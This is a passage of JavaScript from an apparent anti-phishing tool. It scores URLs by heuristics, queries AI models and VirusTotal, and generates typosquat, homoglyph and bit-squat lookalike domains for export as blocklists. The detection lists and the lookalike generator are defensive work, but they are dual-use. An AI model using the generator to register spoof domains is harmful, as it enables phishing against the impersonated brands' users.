        const isOctalIp = /^0[0-7]{2,3}\./.test(hostname);
        const isDwordIp = /^\d{8,11}$/.test(hostname);
        const isRawIpv4 = /^(\d{1,3}\.){3}\d{1,3}$/.test(hostname);

        if (isHexIp || isOctalIp || isDwordIp) {
            isIpDisguised = true; riskScore += 50; ipStatus = 'danger';
            ipDetail = isHexIp ? 'Hexadecimal IP' : isOctalIp ? 'Octal IP' : 'Dword integer IP';
            findings.push({ severity: 'danger', icon: '🔢', title: 'Obfuscated IP Host (' + ipDetail + ')', detail: 'Uses numeric/hex IP encoding to bypass domain blocklists.' });
        } else if (isRawIpv4) {
            riskScore += 25; ipStatus = 'warn'; ipDetail = 'Direct raw IPv4 (' + hostname + ')';
            findings.push({ severity: 'warn', icon: '🌐', title: 'Direct IP Host', detail: 'Direct connection to raw IP without registered domain.' });
        }
        const HIGH_RISK_TLDS = ['.xyz', '.top', '.click', '.su', '.zip', '.mov', '.buzz', '.cfd', '.rest', '.icu', '.tk', '.ml', '.ga', '.cf', '.gq', '.country', '.stream', '.kim', '.monster', '.support', '.cam'];
        let tldStatus = 'safe', tldDetail = 'Standard domain TLD';
        const matchedTld = HIGH_RISK_TLDS.find(tld => hostname.endsWith(tld));
        if (matchedTld) {
            riskScore += 30; tldStatus = 'danger'; tldDetail = 'High-abuse TLD (' + matchedTld + ')';
            findings.push({ severity: 'danger', icon: '🚩', title: 'High-Abuse Top-Level Domain (' + matchedTld + ')', detail: 'Registered under `' + matchedTld + '`, statistically linked to phishing.' });
        }

        const BRAND_TARGETS = ['microsoft', 'office', 'login', 'paypal', 'google', 'apple', 'amazon', 'netflix', 'chase', 'wellsfargo', 'docusign', 'adobe', 'coinbase', 'binance', 'dropbox', 'github', 'onedrive', 'sharepoint', 'auth', 'verify', 'account'];
        let subdomainStatus = 'safe', subdomainDetail = 'Normal subdomain depth';
        const domainParts = hostname.split('.');
        if (domainParts.length >= 4) {
            riskScore += 20; subdomainStatus = 'warn'; subdomainDetail = 'Stacked subdomains (' + (domainParts.length - 2) + ' levels)';
            findings.push({ severity: 'warn', icon: '🏗️', title: 'Excessive Subdomain Stacking', detail: 'Contains ' + domainParts.length + ' labels to conceal root domain on mobile bars.' });
        }

        const rootDomain = domainParts.slice(-2).join('.');
        const subdomainsStr = domainParts.slice(0, -2).join('.');
        const matchedBrand = BRAND_TARGETS.find(b => subdomainsStr.includes(b) && !rootDomain.includes(b));
        if (matchedBrand) {
            riskScore += 45; subdomainStatus = 'danger'; subdomainDetail = 'Brand spoofing in subdomain (' + matchedBrand + ')';
            findings.push({ severity: 'danger', icon: '🎯', title: 'Subdomain Brand Impersonation (' + matchedBrand + ')', detail: 'Subdomain mimics `' + matchedBrand + '`, while root host is `' + rootDomain + '`.' });
        }

        let redirectStatus = 'safe', redirectDetail = 'No redirection parameters';
        const REDIRECT_PARAMS = ['q', 'url', 'redirect', 'dest', 'target', 'next', 'return_to', 'link', 'r', 'u', 'to', 'out', 'forward', 'goto', 'continue', 'auth_url'];
        const searchParams = [];
        parsed.searchParams.forEach((val, key) => { searchParams.push({ key, val }); });
        const redirectParam = searchParams.find(p => REDIRECT_PARAMS.includes(p.key.toLowerCase()) && (/^https?:\/\//i.test(p.val) || /^\/\//.test(p.val)));
        if (redirectParam) {
            riskScore += 40; redirectStatus = 'danger'; redirectDetail = 'Open redirect (`' + redirectParam.key + '` -> ' + redirectParam.val.substring(0, 30) + '...)';
            findings.push({ severity: 'danger', icon: '↪️', title: 'Open Redirect Exploitation', detail: 'Uses `?' + redirectParam.key + '=' + redirectParam.val + '` to bounce user to external site.' });
        }

        const SENSITIVE_KEYS = ['email', 'login_hint', 'user', 'session', 'token', 'auth', 'saml', 'jwt', 'code', 'password', 'key'];
        const harvestedParams = searchParams.filter(p => SENSITIVE_KEYS.includes(p.key.toLowerCase()));
        if (harvestedParams.length) {
            riskScore += 25;
            findings.push({ severity: 'warn', icon: '🔑', title: 'Credential/Session Harvest Parameters', detail: 'Query parameter(s) `?' + harvestedParams.map(p => p.key).join(', ') + '` present.' });
        }

        riskScore = Math.min(Math.max(riskScore, 0), 100);
        let verdict = 'SAFE / LOW RISK', verdictClass = 'risk-safe';
        if (riskScore >= 60) { verdict = 'HIGH RISK / PHISHING DETECTED'; verdictClass = 'risk-high'; }
        else if (riskScore >= 30) { verdict = 'SUSPICIOUS / ELEVATED RISK'; verdictClass = 'risk-med'; }

        const summary = riskScore >= 60
            ? 'The target link displays active evasion mechanisms (e.g. ' + (findings[0]?.title || 'phishing indicators') + ') characteristic of credential harvesting attacks.'
            : riskScore >= 30
            ? 'The target link contains suspicious structures or unencrypted protocol.'
            : 'No deceptive homographs, IP disguises, open redirects, or subdomain stacking detected.';

        const recommendations = riskScore >= 60 ? [
            'Do not open this URL on corporate or personal endpoints.',
            'Block domain `' + rootDomain + '` at network gateway.',
            'If opened, trigger credential reset and session revocation.'
        ] : riskScore >= 30 ? [
            'Verify destination domain with sender before authenticating.'
        ] : [
            'Standard link format, but always verify context before submitting credentials.'
        ];

        return {
            rawUrl: rawInput, normalizedUrl: parsed.toString(), protocol: parsed.protocol.replace(':', ''),
            hostname: parsed.hostname, unicodeHost, isPunycode, pathname: parsed.pathname,
            search: parsed.search, queryParams: searchParams, riskScore, verdict, verdictClass,
            engine: 'Phish-Guard Deep URL Sandbox & Heuristic De-obfuscator',
            matrix: {
                punycode: { status: punycodeStatus, label: isPunycode ? 'Punycode Homograph' : 'Standard ASCII', detail: punycodeDetail },
                redirect: { status: redirectStatus, label: redirectParam ? 'Open Redirect' : 'Clean / Direct', detail: redirectDetail },
                subdomains: { status: subdomainStatus, label: subdomainStatus === 'danger' ? 'Brand Squatting' : subdomainStatus === 'warn' ? 'Stacked' : 'Normal', detail: subdomainDetail },
                tld: { status: tldStatus, label: matchedTld ? 'High-Risk TLD' : 'Standard', detail: tldDetail },
                ipDisguise: { status: ipStatus, label: isIpDisguised ? 'IP Disguised' : isRawIpv4 ? 'Raw IP' : 'Standard DNS', detail: ipDetail }
            },
            findings, summary, recommendations
        };
    }

    async function analyzeUrlWithGemini(urlStr, apiKey) {
        const prompt = `You are a Principal Cyber Forensics Analyst specializing in Quishing and URL evasion (IDN Homographs, IP disguises, open redirects, subdomain brand stacking).

Analyze this target URL:
${urlStr}

Respond with ONLY a single valid JSON object adhering strictly to this schema:
{
  "riskScore": 85,
  "verdict": "HIGH RISK / PHISHING DETECTED",
  "verdictClass": "risk-high",
  "summary": "1-2 sentence executive threat summary",
  "findings": [
    {
      "severity": "danger",
      "icon": "🎭",
      "title": "Threat Title",
      "detail": "Technical description"
    }
  ],
  "recommendations": [
    "Actionable recommendation"
  ]
}`;
        const url = `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${apiKey}`;
        const resp = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                contents: [{ parts: [{ text: prompt }] }],
                generationConfig: { responseMimeType: "application/json", temperature: 0.1 }
            })
        });

        if (!resp.ok) {
            let errText = '';
            try { errText = (await resp.json()).error?.message || resp.statusText; } catch (_) { errText = await resp.text(); }
            throw new Error('Gemini URL API error (' + resp.status + '): ' + errText);
        }

        const data = await resp.json();
        const rawContent = data.candidates?.[0]?.content?.parts?.[0]?.text;
        if (!rawContent) throw new Error('Gemini returned an empty response.');
        return JSON.parse(rawContent);
    }

    async function analyzeUrlWithOpenAI(urlStr, apiKey) {
        const prompt = `You are a Principal Cyber Forensics Analyst specializing in Quishing and URL evasion (IDN Homographs, IP disguises, open redirects, subdomain brand stacking).

Analyze this target URL:
${urlStr}

Respond with ONLY a single valid JSON object adhering strictly to this schema:
{
  "riskScore": 85,
  "verdict": "HIGH RISK / PHISHING DETECTED",
  "verdictClass": "risk-high",
  "summary": "1-2 sentence executive threat summary",
  "findings": [
    {
      "severity": "danger",
      "icon": "🎭",
      "title": "Threat Title",
      "detail": "Technical description"
    }
  ],
  "recommendations": [
    "Actionable recommendation"
  ]
}`;
        const resp = await fetch('https://api.openai.com/v1/chat/completions', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${apiKey}`
            },
            body: JSON.stringify({
                model: OPENAI_MODEL,
                messages: [{ role: 'user', content: prompt }],
                response_format: { type: "json_object" },
                temperature: 0.1
            })
        });

        if (!resp.ok) {
            let errText = '';
            try { errText = (await resp.json()).error?.message || resp.statusText; } catch (_) { errText = await resp.text(); }
            throw new Error('OpenAI URL API error (' + resp.status + '): ' + errText);
        }

        const data = await resp.json();
        const content = data.choices?.[0]?.message?.content;
        if (!content) throw new Error('OpenAI returned an empty response.');
        return JSON.parse(content);
    }
    async function handleUrlScan() {
        const rawText = dom.urlInput ? dom.urlInput.value.trim() : '';
        if (!rawText) {
            alert('Please enter a target URL or upload/paste a QR code image.');
            return;
        }

        clearUrlResults();
        setUrlLoading(true);
        setUrlStatus('De-obfuscating homographs, redirects & subdomains…');

        try {
            const heuristicResult = analyzeUrlHeuristic(rawText);

            if (vtKey && heuristicResult.normalizedUrl) {
                setUrlStatus('Querying VirusTotal threat intelligence…');
                try {
                    const vtRes = await checkVirusTotal([heuristicResult.normalizedUrl], vtKey);
                    if (vtRes && vtRes.length) heuristicResult.vtData = vtRes[0];
                } catch (vtErr) {
                    console.warn('VirusTotal query failed for URL:', vtErr);
                }
            }

            if (aiProvider !== 'heuristic' && apiKey) {
                setUrlStatus('Running deep AI forensic URL sandbox (' + (aiProvider === 'gemini' ? 'Gemini 1.5 Flash' : 'GPT-4o-mini') + ')…');
                try {
                    const aiData = aiProvider === 'openai'
                        ? await analyzeUrlWithOpenAI(heuristicResult.normalizedUrl, apiKey)
                        : await analyzeUrlWithGemini(heuristicResult.normalizedUrl, apiKey);

                    if (aiData.findings && Array.isArray(aiData.findings) && aiData.findings.length) heuristicResult.findings = aiData.findings;
                    if (typeof aiData.riskScore === 'number') heuristicResult.riskScore = aiData.riskScore;
                    if (aiData.verdict) heuristicResult.verdict = aiData.verdict;
                    if (aiData.verdictClass) heuristicResult.verdictClass = aiData.verdictClass;
                    if (aiData.summary) heuristicResult.summary = aiData.summary;
                    if (aiData.recommendations) heuristicResult.recommendations = aiData.recommendations;
                    heuristicResult.engine = aiProvider === 'openai' ? 'OpenAI GPT-4o-mini + Deep URL Sandbox' : 'Google Gemini 1.5 Flash + Deep URL Sandbox';
                } catch (aiErr) {
                    console.warn('AI URL forensic sandbox fallback to heuristics:', aiErr);
                }
            }

            lastUrlScanData = {
                timestamp: new Date().toISOString(),
                engine: heuristicResult.engine,
                data: heuristicResult
            };

            renderUrlResults(heuristicResult);
        } catch (err) {
            console.error('URL Sandbox failed:', err);
            dom.urlResultArea.innerHTML =
                '<div class="error-box"><strong>URL Sandbox Error:</strong> ' + escapeHtml(err.message || 'Failed to sandbox URL.') + '</div>';
        } finally {
            setUrlLoading(false);
        }
    }

    function renderUrlResults(data) {
        if (!dom.urlResultArea) return;
        const matrix = data.matrix;

        let html = '<div class="verdict-banner ' + data.verdictClass + '">'
                 + '<div class="verdict-left">'
                 + '<div class="risk-score-badge">' + data.riskScore + '</div>'
                 + '<div class="verdict-text-wrap">'
                 + '<span class="verdict-title">' + escapeHtml(data.verdict) + '</span>'
                 + '<span class="verdict-engine">Engine: ' + escapeHtml(data.engine) + '</span>'
                 + '</div>'
                 + '</div>'
                 + '</div>';

        html += '<div class="auth-matrix-card">'
              + '<h3 class="card-label">🔬 Deep De-obfuscation &amp; Evasion Matrix</h3>'
              + '<div class="auth-matrix-grid">'
              + '  <div class="auth-matrix-item"><span class="auth-lbl">Punycode / Homograph</span><span class="auth-badge-pill pill-' + matrix.punycode.status + '">' + escapeHtml(matrix.punycode.label) + '</span><span class="auth-detail-text">' + escapeHtml(matrix.punycode.detail) + '</span></div>'
              + '  <div class="auth-matrix-item"><span class="auth-lbl">IP Obfuscation</span><span class="auth-badge-pill pill-' + matrix.ipDisguise.status + '">' + escapeHtml(matrix.ipDisguise.label) + '</span><span class="auth-detail-text">' + escapeHtml(matrix.ipDisguise.detail) + '</span></div>'
              + '  <div class="auth-matrix-item"><span class="auth-lbl">Open Redirect</span><span class="auth-badge-pill pill-' + matrix.redirect.status + '">' + escapeHtml(matrix.redirect.label) + '</span><span class="auth-detail-text">' + escapeHtml(matrix.redirect.detail) + '</span></div>'
              + '  <div class="auth-matrix-item"><span class="auth-lbl">Subdomain Depth</span><span class="auth-badge-pill pill-' + matrix.subdomains.status + '">' + escapeHtml(matrix.subdomains.label) + '</span><span class="auth-detail-text">' + escapeHtml(matrix.subdomains.detail) + '</span></div>'
              + '  <div class="auth-matrix-item"><span class="auth-lbl">TLD Reputation</span><span class="auth-badge-pill pill-' + matrix.tld.status + '">' + escapeHtml(matrix.tld.label) + '</span><span class="auth-detail-text">' + escapeHtml(matrix.tld.detail) + '</span></div>'
              + '</div>'
              + '</div>';

        html += '<div class="url-decomp-card">'
              + '<h3 class="card-label">🧱 Decomposed URL Architecture</h3>'
              + '<div class="url-decomp-table">'
              + '  <div class="url-decomp-row"><span class="url-decomp-label">Protocol:</span><span class="url-decomp-val ' + (data.protocol === 'http' ? 'val-alert' : 'val-safe') + '">' + escapeHtml(data.protocol.toUpperCase()) + '</span></div>'
              + '  <div class="url-decomp-row"><span class="url-decomp-label">Encoded Hostname:</span><span class="url-decomp-val ' + (data.isPunycode ? 'val-alert' : '') + '">' + escapeHtml(data.hostname) + '</span></div>'
              + (data.isPunycode ? '  <div class="url-decomp-row"><span class="url-decomp-label">Decoded Unicode Host:</span><span class="url-decomp-val val-alert">' + escapeHtml(data.unicodeHost) + ' (IDN Lookalike)</span></div>' : '')
              + '  <div class="url-decomp-row"><span class="url-decomp-label">Target Path:</span><span class="url-decomp-val">' + escapeHtml(data.pathname || '/') + '</span></div>'
              + '</div>';

        if (data.queryParams && data.queryParams.length) {
            html += '<div style="margin-top: 14px;"><span class="card-label" style="font-size:0.8rem; margin-bottom:6px; display:block;">Extracted Query Parameters (' + data.queryParams.length + '):</span>';
            html += '<div class="url-decomp-table">';
            const SENSITIVE_KEYS = ['email', 'login_hint', 'user', 'session', 'token', 'auth', 'saml', 'jwt', 'code', 'password', 'key', 'q', 'url', 'redirect', 'dest', 'target', 'next', 'return_to'];
            data.queryParams.forEach(p => {
                const isKeyAlert = SENSITIVE_KEYS.includes(p.key.toLowerCase());
                html += '<div class="url-decomp-row"><span class="url-decomp-label">' + escapeHtml(p.key) + ':</span><span class="url-decomp-val ' + (isKeyAlert ? 'val-alert' : '') + '">' + escapeHtml(p.val) + '</span></div>';
            });
            html += '</div></div>';
        }
        html += '</div>';

        if (data.vtData) {
            const vt = data.vtData;
            html += '<div class="vt-card" style="margin-bottom:16px;">'
                  + '<h3 class="card-label">🛡️ VirusTotal Live Intelligence</h3>'
                  + '<div class="vt-stats">'
                  + '<div class="vt-badge vt-danger">Malicious: ' + (vt.malicious || 0) + '</div>'
                  + '<div class="vt-badge vt-warn">Suspicious: ' + (vt.suspicious || 0) + '</div>'
                  + '<div class="vt-badge vt-clean">Harmless: ' + (vt.harmless || 0) + '</div>'
                  + '</div></div>';
        }
        if (data.summary) {
            html += '<div class="summary-card" style="margin-bottom:16px;">'
                  + '<h3 class="card-label">📋 Threat Executive Summary</h3>'
                  + '<p class="summary-text">' + escapeHtml(data.summary) + '</p>'
                  + '</div>';
        }

        if (data.findings && data.findings.length) {
            html += '<div class="spoof-indicators-card">'
                  + '<h3 class="card-label">🚨 Forensic Findings &amp; Deceptions (' + data.findings.length + ')</h3>'
                  + '<ul class="spoof-list">';
            data.findings.forEach(f => {
                const sClass = f.severity === 'danger' ? 'spoof-item-danger' : f.severity === 'warn' ? 'spoof-item-warn' : 'spoof-item-safe';
                html += '<li class="spoof-item ' + sClass + '">'
                      + '<span class="spoof-icon">' + (f.icon || '⚡') + '</span>'
                      + '<div class="spoof-text"><strong>' + escapeHtml(f.title) + '</strong>: ' + escapeHtml(f.detail) + '</div>'
                      + '</li>';
            });
            html += '</ul></div>';
        }

        html += '<div class="export-actions-row">'
              + '<button type="button" class="btn-export" id="btnCopyUrlReport">📋 Copy Sandbox Dossier</button>'
              + '</div>';

        dom.urlResultArea.innerHTML = html;

        const copyBtn = $('#btnCopyUrlReport');
        if (copyBtn) {
            copyBtn.addEventListener('click', () => {
                let md = '# Phish-Guard Deep URL Sandbox Dossier\n\n';
                md += '- **Verdict:** ' + data.verdict + '\n';
                md += '- **Risk Score:** ' + data.riskScore + '/100\n';
                md += '- **Engine:** ' + data.engine + '\n';
                md += '- **Target URL:** `' + data.normalizedUrl + '`\n';
                md += '- **Protocol:** ' + data.protocol.toUpperCase() + '\n';
                md += '- **Hostname:** ' + data.hostname + (data.isPunycode ? ' (Unicode: ' + data.unicodeHost + ')' : '') + '\n\n';
                md += '## De-obfuscation Matrix\n';
                md += '- **Punycode / Homograph:** ' + matrix.punycode.label + ' - ' + matrix.punycode.detail + '\n';
                md += '- **IP Obfuscation:** ' + matrix.ipDisguise.label + ' - ' + matrix.ipDisguise.detail + '\n';
                md += '- **Open Redirect:** ' + matrix.redirect.label + ' - ' + matrix.redirect.detail + '\n';
                md += '- **Subdomain Depth:** ' + matrix.subdomains.label + ' - ' + matrix.subdomains.detail + '\n';
                md += '- **TLD Reputation:** ' + matrix.tld.label + ' - ' + matrix.tld.detail + '\n\n';
                if (data.findings && data.findings.length) {
                    md += '## Forensic Findings\n';
                    data.findings.forEach(f => {
                        md += '- ' + (f.icon || '⚡') + ' **' + f.title + ':** ' + f.detail + '\n';
                    });
                }
                navigator.clipboard.writeText(md).then(() => {
                    const oldText = copyBtn.innerHTML;
                    copyBtn.innerHTML = '✅ Copied!';
                    setTimeout(() => { copyBtn.innerHTML = oldText; }, 2000);
                });
            });
        }
    }

    // ================================================================
    //  TAB 4: BRAND LOOKALIKE & TYPOSQUAT RADAR ENGINE
    // ================================================================
    function handleRadarGenerate() {
        if (!dom.radarDomainInput) return;
        const raw = dom.radarDomainInput.value.trim();
        if (!raw) {
            showRadarError('Please enter a target domain name (e.g. acmecorp.com or paypal.com).');
            return;
        }

        setRadarLoading(true, 'Permutating homoglyphs, bit-squats & brand keyword stack variants…');
        setTimeout(() => {
            try {
                const results = generateRadarLookalikes(raw);
                radarCurrentResults = results;
                radarFilterCategory = 'all';
                radarSearchQuery = '';
                renderRadarResults(results);
            } catch (err) {
                showRadarError('Error generating lookalikes: ' + err.message);
            } finally {
                setRadarLoading(false);
            }
        }, 80);
    }

    function setRadarLoading(on, text = '') {
        if (dom.radarLoading) dom.radarLoading.classList.toggle('hidden', !on);
        if (dom.radarStatusText && text) dom.radarStatusText.textContent = text;
        if (dom.btnGenerateRadar) dom.btnGenerateRadar.disabled = on;
        if (dom.btnAiDefenseAdvice) dom.btnAiDefenseAdvice.disabled = on;
    }

    function showRadarError(msg) {
        if (dom.radarResultArea) {
            dom.radarResultArea.innerHTML = '<div class="error-box">⚠️ ' + escapeHtml(msg) + '</div>';
        }
    }

    function parseDomainTarget(input) {
        let clean = input.trim().toLowerCase();
        clean = clean.replace(/^[a-z]+:\/\//i, '');
        clean = clean.split('/')[0].split(':')[0].split('?')[0].split('#')[0];
        clean = clean.replace(/^www\./i, '');

        const parts = clean.split('.');
        if (parts.length < 2) {
            return { raw: clean, label: clean, tld: 'com', full: clean + '.com' };
        }

        const MULTI_TLDS = ['co.uk', 'com.au', 'co.nz', 'co.jp', 'com.br', 'gov.uk', 'ac.uk', 'org.uk'];
        const lastTwo = parts.slice(-2).join('.');
        if (MULTI_TLDS.includes(lastTwo) && parts.length > 2) {
            const tld = lastTwo;
            const label = parts.slice(0, -2).join('.');
            return { raw: clean, label, tld, full: label + '.' + tld };
        }

        const tld = parts.pop();
        const label = parts.join('.');
        return { raw: clean, label, tld, full: label + '.' + tld };
    }

    function generateRadarLookalikes(rawInput) {
        const parsed = parseDomainTarget(rawInput);
        const name = parsed.label;
        const origTld = parsed.tld;
        const variants = [];
        const seen = new Set();

        function addVariant(item) {
            const key = item.domain.toLowerCase();
            if (key === parsed.full.toLowerCase() || seen.has(key)) return;
            seen.add(key);

            let puny = '';
            if (/[^\u0020-\u007E]/.test(item.domain)) {
                try {
                    const labelPart = item.domain.split('.')[0];
                    const tldPart = item.domain.split('.').slice(1).join('.');
                    puny = punycodeEncode(labelPart) + '.' + tldPart;
                } catch (e) {
                    puny = item.domain;
                }
            }
            item.punycode = puny;
            variants.push(item);
        }

        // 1. Homoglyphs (Cyrillic, Greek lookalikes)
        const HOMOGLYPH_MAP = {
            'a': ['а', 'à', 'á'],
            'c': ['с'],
            'e': ['е', 'é', 'è'],
            'i': ['і', '1', 'l'],
            'j': ['ј'],
            'l': ['1', 'i'],
            'o': ['о', '0'],
            'p': ['р'],
            's': ['ѕ', '5'],
            'u': ['υ'],
            'v': ['ν'],
            'x': ['х'],
            'y': ['у']
        };

        for (let i = 0; i < name.length; i++) {
            const ch = name[i];
            const replacements = HOMOGLYPH_MAP[ch];
            if (replacements) {
                replacements.forEach(r => {
                    const sub = name.substring(0, i) + r + name.substring(i + 1);
                    addVariant({
                        domain: sub + '.' + origTld,
                        category: 'homoglyph',
                        categoryLabel: 'Homoglyph Lookalike',
                        risk: 'critical',
                        riskLabel: 'Critical',
                        score: 95,
                        desc: `Visual spoof: Replaced '${ch}' at pos ${i+1} with '${r}' (IDN Homograph)`
                    });
                });
            }
        }

        // 2. High-Risk Abusive TLD Swapping
        const HIGH_RISK_TLDS = ['top', 'xyz', 'cfd', 'click', 'zip', 'su', 'rest', 'cam', 'buzz', 'pw', 'online', 'cloud'];
        HIGH_RISK_TLDS.forEach(tld => {
            if (tld !== origTld) {
                addVariant({
                    domain: name + '.' + tld,
                    category: 'tld-swap',
                    categoryLabel: 'High-Risk TLD Swap',
                    risk: 'high',
                    riskLabel: 'High',
                    score: 82,
                    desc: `Brand name registered under known high-abuse phishing TLD (.${tld})`
                });
            }
        });

        // 3. Brand Keyword Stacking
        const CRITICAL_KEYWORDS = ['login', 'sso', 'auth', 'verify', 'portal', 'security', 'mfa', 'support', 'update', 'account'];
        CRITICAL_KEYWORDS.forEach(kw => {
            addVariant({
                domain: `${name}-${kw}.${origTld}`,
                category: 'keyword',
                categoryLabel: 'Keyword Stacking',
                risk: 'critical',
                riskLabel: 'Critical',
                score: 88,
                desc: `Hyphenated phishing lure target: ${name}-${kw}`
            });
            addVariant({
                domain: `${kw}-${name}.${origTld}`,
                category: 'keyword',
                categoryLabel: 'Keyword Stacking',
                risk: 'critical',
                riskLabel: 'Critical',
                score: 86,
                desc: `Prefixed credential harvest lure: ${kw}-${name}`
            });
            addVariant({
                domain: `${name}-${kw}.top`,
                category: 'keyword',
                categoryLabel: 'Keyword + Abusive TLD',
                risk: 'critical',
                riskLabel: 'Critical',
                score: 96,
                desc: `High-threat combo: credential lure '${kw}' hosted on abusive .top TLD`
            });
        });
        // 4. Character Omission
        for (let i = 0; i < name.length; i++) {
            if (name.length > 3) {
                const omitted = name.substring(0, i) + name.substring(i + 1);
                addVariant({
                    domain: omitted + '.' + origTld,
                    category: 'omission-swap',
                    categoryLabel: 'Character Omission',
                    risk: 'medium',
                    riskLabel: 'Medium',
                    score: 65,
                    desc: `Typosquatting: Omitted '${name[i]}' at pos ${i+1}`
                });
            }
        }

        // 5. Adjacent Transposition
        for (let i = 0; i < name.length - 1; i++) {
            if (name[i] !== name[i + 1]) {
                const transposed = name.substring(0, i) + name[i + 1] + name[i] + name.substring(i + 2);
                addVariant({
                    domain: transposed + '.' + origTld,
                    category: 'omission-swap',
                    categoryLabel: 'Adjacent Transposition',
                    risk: 'medium',
                    riskLabel: 'Medium',
                    score: 68,
                    desc: `Fat-finger typo: Swapped '${name[i]}' and '${name[i+1]}'`
                });
            }
        }

        // 6. Character Repetition
        for (let i = 0; i < name.length; i++) {
            const repeated = name.substring(0, i) + name[i] + name[i] + name.substring(i + 1);
            addVariant({
                domain: repeated + '.' + origTld,
                category: 'omission-swap',
                categoryLabel: 'Character Repetition',
                risk: 'low',
                riskLabel: 'Low',
                score: 45,
                desc: `Keyboard stutter: Repeated character '${name[i]}'`
            });
        }

        // 7. Bit-Squatting
        for (let i = 0; i < name.length; i++) {
            const code = name.charCodeAt(i);
            for (let bit = 0; bit < 8; bit++) {
                const flippedCode = code ^ (1 << bit);
                const flippedChar = String.fromCharCode(flippedCode).toLowerCase();
                if (/^[a-z0-9-]$/.test(flippedChar) && flippedChar !== name[i]) {
                    const bitsquat = name.substring(0, i) + flippedChar + name.substring(i + 1);
                    addVariant({
                        domain: bitsquat + '.' + origTld,
                        category: 'bitsquat',
                        categoryLabel: 'Bit-Squatting',
                        risk: 'medium',
                        riskLabel: 'Medium',
                        score: 60,
                        desc: `Bit flip: 0x${code.toString(16)} -> 0x${flippedCode.toString(16)} ('${name[i]}' -> '${flippedChar}')`
                    });
                }
            }
        }

        variants.sort((a, b) => b.score - a.score);

        const stats = {
            total: variants.length,
            critical: variants.filter(v => v.risk === 'critical').length,
            high: variants.filter(v => v.risk === 'high').length,
            homoglyphs: variants.filter(v => v.category === 'homoglyph').length,
            tldSwaps: variants.filter(v => v.category === 'tld-swap').length,
            keywords: variants.filter(v => v.category === 'keyword').length,
            omissions: variants.filter(v => v.category === 'omission-swap').length,
            bitsquats: variants.filter(v => v.category === 'bitsquat').length
        };

        return { target: parsed, stats, variants };
    }





    function renderRadarResults(data) {
        if (!dom.radarResultArea) return;
        const st = data.stats;

        let html = '<div class="radar-stats-grid">'
                 + '  <div class="radar-stat-box"><span class="radar-stat-lbl">Total Lookalikes</span><span class="radar-stat-num cyan-stat">' + st.total + '</span></div>'
                 + '  <div class="radar-stat-box"><span class="radar-stat-lbl">Critical / High</span><span class="radar-stat-num critical-stat">' + (st.critical + st.high) + '</span></div>'
                 + '  <div class="radar-stat-box"><span class="radar-stat-lbl">Homoglyphs (IDN)</span><span class="radar-stat-num warn-stat">' + st.homoglyphs + '</span></div>'
                 + '  <div class="radar-stat-box"><span class="radar-stat-lbl">Abusive TLD Swaps</span><span class="radar-stat-num">' + st.tldSwaps + '</span></div>'
                 + '</div>';

        html += '<div id="radarAiContainer"></div>';

        html += '<div class="radar-controls-card">'
              + '  <div class="radar-filter-pills" id="radarFilterPills">'
              + '    <button type="button" class="radar-pill-btn active" data-filter="all">All (' + st.total + ')</button>'
              + '    <button type="button" class="radar-pill-btn" data-filter="critical">🚨 Critical (' + st.critical + ')</button>'
              + '    <button type="button" class="radar-pill-btn" data-filter="homoglyph">🔤 Homoglyphs (' + st.homoglyphs + ')</button>'
              + '    <button type="button" class="radar-pill-btn" data-filter="keyword">🔑 Keyword Stacking (' + st.keywords + ')</button>'
              + '    <button type="button" class="radar-pill-btn" data-filter="tld-swap">🌐 TLD Swaps (' + st.tldSwaps + ')</button>'
              + '    <button type="button" class="radar-pill-btn" data-filter="omission-swap">🔀 Typos &amp; Swaps (' + st.omissions + ')</button>'
              + '    <button type="button" class="radar-pill-btn" data-filter="bitsquat">⚡ Bit-Squats (' + st.bitsquats + ')</button>'
              + '  </div>'
              + '  <input type="text" id="radarSearchBox" class="radar-search-input" placeholder="🔍 Search variants...">'
              + '</div>';

        html += '<div class="radar-table-container">'
              + '  <table class="radar-table">'
              + '    <thead>'
              + '      <tr>'
              + '        <th>Candidate Domain &amp; IDN Punycode</th>'
              + '        <th>Technique</th>'
              + '        <th>Threat Description</th>'
              + '        <th>Risk Tier</th>'
              + '        <th style="text-align:right;">Action</th>'
              + '      </tr>'
              + '    </thead>'
              + '    <tbody id="radarTableBody"></tbody>'
              + '  </table>'
              + '</div>';

        html += '<div class="export-actions-row">'
              + '  <button type="button" class="btn-export" id="btnCopyRadarList">📋 Copy Domain List</button>'
              + '  <button type="button" class="btn-export" id="btnExportDnsBlocklist">🛡️ Export DNS Blocklist (.txt)</button>'
              + '  <button type="button" class="btn-export" id="btnExportRadarCsv">📊 Export Threat Intel (.csv)</button>'
              + '</div>';

        dom.radarResultArea.innerHTML = html;

        filterAndRenderRadarTable();

        const pills = $$('.radar-pill-btn');
        pills.forEach(p => {
            p.addEventListener('click', () => {
                pills.forEach(b => b.classList.remove('active'));
                p.classList.add('active');
                radarFilterCategory = p.dataset.filter;
                filterAndRenderRadarTable();
            });
        });

        const searchBox = $('#radarSearchBox');
        if (searchBox) {
            searchBox.addEventListener('input', (e) => {
                radarSearchQuery = e.target.value.trim().toLowerCase();
                filterAndRenderRadarTable();
            });
        }

        const copyBtn = $('#btnCopyRadarList');
        if (copyBtn) copyBtn.addEventListener('click', copyRadarDomainList);

        const dnsBtn = $('#btnExportDnsBlocklist');
        if (dnsBtn) dnsBtn.addEventListener('click', exportRadarDnsBlocklist);

        const csvBtn = $('#btnExportRadarCsv');
        if (csvBtn) csvBtn.addEventListener('click', exportRadarCsv);
    }

    function filterAndRenderRadarTable() {
        if (!radarCurrentResults) return;
        const tbody = $('#radarTableBody');
        if (!tbody) return;

        let filtered = radarCurrentResults.variants;
        if (radarFilterCategory === 'critical') {
            filtered = filtered.filter(v => v.risk === 'critical');
        } else if (radarFilterCategory !== 'all') {
            filtered = filtered.filter(v => v.category === radarFilterCategory);
        }

        if (radarSearchQuery) {
            filtered = filtered.filter(v =>
                v.domain.toLowerCase().includes(radarSearchQuery) ||
                (v.punycode && v.punycode.toLowerCase().includes(radarSearchQuery)) ||
                v.desc.toLowerCase().includes(radarSearchQuery)
            );
        }

        if (filtered.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:24px; color:#6b7280;">No lookalike variants match the selected filter.</td></tr>';
            return;
        }

        let rowsHtml = '';
        filtered.forEach(item => {
            const riskClass = 'radar-risk-' + item.risk;
            rowsHtml += '<tr>'
